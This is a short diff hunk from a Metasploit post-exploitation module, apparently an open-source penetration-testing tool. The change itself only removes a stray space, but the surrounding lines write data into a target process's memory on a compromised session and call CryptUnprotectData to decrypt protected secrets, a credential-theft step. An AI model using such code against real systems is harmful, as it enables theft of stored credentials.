@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Post
     mem = process.memory.allocate(128)
     process.memory.write(mem, data)
 
-    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
+    if session.sys.process.each_process.find { |i| i['pid'] == pid }['arch'] == 'x86'
       addr = [mem].pack('V')
       len = [data.length].pack('V')
       ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
